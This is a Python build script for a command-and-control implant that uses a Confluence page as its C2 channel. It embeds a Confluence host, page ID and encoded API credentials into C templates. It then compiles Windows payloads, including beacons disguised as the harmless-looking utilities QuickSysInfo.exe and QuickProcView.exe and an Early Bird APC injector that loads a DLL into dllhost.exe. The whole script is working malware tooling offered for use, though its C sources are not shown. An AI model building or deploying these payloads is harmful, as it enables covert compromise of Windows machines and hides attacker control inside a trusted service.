#!/usr/bin/env python3
# Author: Dhanush Arvind

import argparse
import base64
import os
import shutil
import subprocess
import sys
from urllib.parse import urlparse

TEMPLATE_FILES = ["caller.c", "caller_bundled.c"]
SUPPORT_FILES = ["host_app.c", "earlybird_inject.c", "caller_dll.c", "procview_app.c", "earlybird_bundled.c"]


def parse_url(url: str) -> tuple:
    parsed = urlparse(url)
    host = parsed.hostname or url
    scheme = parsed.scheme or "https"
    port = parsed.port or (443 if scheme == "https" else 80)
    use_wiki = 1 if ".atlassian.net" in host else 0
    return host, port, use_wiki


def replace_placeholders(source: str, config: dict) -> str:
    source = source.replace("__CONFLUENCE_HOST__", config["host"])
    source = source.replace("__CONFLUENCE_PORT__", str(config["port"]))
    source = source.replace("__PAGE_ID__", config["page_id"])
    source = source.replace("__AUTH_B64__", config["auth_b64"])
    source = source.replace("__SLEEP_MS__", str(config["sleep"]))
    source = source.replace("__USE_WIKI_PREFIX__", str(config["use_wiki"]))
    return source


def main():
    parser = argparse.ArgumentParser(description="Configure the Confluence C2 caller")
    parser.add_argument("--url", required=True)
    parser.add_argument("--email", required=True)
    parser.add_argument("--api-token", required=True)
    parser.add_argument("--page-id", required=True)
    parser.add_argument("--sleep", type=int, default=10000)
    parser.add_argument("--no-wiki-prefix", action="store_true")
    parser.add_argument("--output", default="build")
    parser.add_argument("--compile", action="store_true")
    args = parser.parse_args()

    host, port, use_wiki = parse_url(args.url)
    if args.no_wiki_prefix:
        use_wiki = 0

    auth_plain = f"{args.email}:{args.api_token}"
    auth_b64 = base64.b64encode(auth_plain.encode()).decode()

    config = {
        "host": host,
        "port": port,
        "page_id": args.page_id,
        "auth_b64": auth_b64,
        "sleep": args.sleep,
        "use_wiki": use_wiki,
    }

    print(f"[*] Host: {host}:{port}")
    print(f"[*] Page ID: {args.page_id}")
    print(f"[*] Wiki prefix: {'yes' if use_wiki else 'no'}")
    print(f"[*] Sleep: {args.sleep} ms")

    script_dir = os.path.dirname(os.path.abspath(__file__))
    src_dir = os.path.join(script_dir, "src")
    out_dir = os.path.join(script_dir, args.output)
    pay_dir = os.path.join(script_dir, "payloads")
    os.makedirs(out_dir, exist_ok=True)
    os.makedirs(pay_dir, exist_ok=True)

    for fname in TEMPLATE_FILES:
        src_path = os.path.join(src_dir, fname)
        if not os.path.isfile(src_path):
            print(f"[!] Template not found: {src_path}")
            sys.exit(1)
        with open(src_path, "r", encoding="utf-8") as f:
            source = f.read()
        configured = replace_placeholders(source, config)
        dst_path = os.path.join(out_dir, fname)
        with open(dst_path, "w", encoding="utf-8") as f:
            f.write(configured)
        print(f"[+] Configured {fname} -> {dst_path}")

    for fname in SUPPORT_FILES:
        src_path = os.path.join(src_dir, fname)
        dst_path = os.path.join(out_dir, fname)
        if os.path.isfile(src_path):
            shutil.copy2(src_path, dst_path)
            print(f"[+] Copied {fname} -> {dst_path}")

    if args.compile:
        gcc = shutil.which("gcc")
        if not gcc:
            print("[!] gcc not found in PATH")
            return
        targets = [
            {"src": os.path.join(out_dir, "caller.c"),
             "out": os.path.join(out_dir, "caller.exe"),
             "flags": ["-lwinhttp", "-lws2_32"]},
            {"src": os.path.join(out_dir, "caller_bundled.c"),
             "out": os.path.join(out_dir, "QuickSysInfo.exe"),
             "flags": ["-DBUNDLED_BUILD", "-lwinhttp", "-lws2_32", "-liphlpapi"]},
            {"src": os.path.join(out_dir, "host_app.c"),
             "out": os.path.join(out_dir, "QuickSysInfo_clean.exe"),
             "flags": ["-lws2_32", "-liphlpapi"]},
            {"src": os.path.join(out_dir, "caller_dll.c"),
             "out": os.path.join(out_dir, "caller_inject.dll"),
             "flags": ["-shared", "-DBUNDLED_BUILD", "-lwinhttp", "-lws2_32"]},
            {"src": os.path.join(out_dir, "earlybird_inject.c"),
             "out": os.path.join(out_dir, "earlybird_inject.exe"),
             "flags": ["-nostdlib", "-fno-stack-protector", "-fno-builtin",
                       "-Wl,-e,_start"]},
            {"src": os.path.join(out_dir, "earlybird_bundled.c"),
             "out": os.path.join(out_dir, "QuickProcView.exe"),
             "flags": ["-DBUNDLED_BUILD", "-lpsapi"]},
            {"src": os.path.join(out_dir, "procview_app.c"),
             "out": os.path.join(out_dir, "QuickProcView_clean.exe"),
             "flags": ["-lpsapi"]},
        ]
        for t in targets:
            if not os.path.isfile(t["src"]):
                continue
            cmd = [gcc, "-O2", "-o", t["out"], t["src"]] + t["flags"]
            print(f"[*] Compiling: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Built {t['out']}")
                pay_name = os.path.basename(t["out"])
                shutil.copy2(t["out"], os.path.join(pay_dir, pay_name))
                print(f"[+] Copied {pay_name} -> payloads/")
            else:
                print(f"[!] Failed: {t['src']}")
                print(result.stderr)

    print(f"\n[*] Configuration complete. Output: {out_dir}")
    print(f"\n[*] Payloads:")
    print(f"    Payload 1 (Standalone):    caller.exe")
    print(f"    Payload 2 (SysInfo):       QuickSysInfo.exe    [caller + host_app bundled]")
    print(f"    Payload 3 (EarlyBird):     earlybird_inject.exe + caller_inject.dll [APC injects into dllhost.exe]")
    print(f"    Payload 4 (ProcView):      QuickProcView.exe  + caller_inject.dll [earlybird + procview bundled]")
    if not args.compile:
        print(f"\n[*] Manual compilation (from {out_dir}/):")
        print(f"    gcc -O2 -o {out_dir}/caller.exe {out_dir}/caller.c -lwinhttp -lws2_32")
        print(f"    gcc -O2 -DBUNDLED_BUILD -o {out_dir}/QuickSysInfo.exe "
              f"{out_dir}/caller_bundled.c -lwinhttp -lws2_32 -liphlpapi")
        print(f"    gcc -O2 -o {out_dir}/QuickSysInfo_clean.exe "
              f"{out_dir}/host_app.c -lws2_32 -liphlpapi")
        print(f"    gcc -shared -O2 -DBUNDLED_BUILD -o {out_dir}/caller_inject.dll "
              f"{out_dir}/caller_dll.c -lwinhttp -lws2_32")
        print(f"    gcc -O2 -nostdlib -fno-stack-protector -fno-builtin "
              f"-Wl,-e,_start -o {out_dir}/earlybird_inject.exe {out_dir}/earlybird_inject.c")
        print(f"    gcc -O2 -DBUNDLED_BUILD -o {out_dir}/QuickProcView.exe "
              f"{out_dir}/earlybird_bundled.c -lpsapi")
        print(f"    gcc -O2 -o {out_dir}/QuickProcView_clean.exe "
              f"{out_dir}/procview_app.c -lpsapi")
        print(f"\n[*] After compilation, copy binaries to payloads/:"
              f"\n    copy {out_dir}\\*.exe payloads\\"
              f"\n    copy {out_dir}\\*.dll payloads\\")


if __name__ == "__main__":
    main()
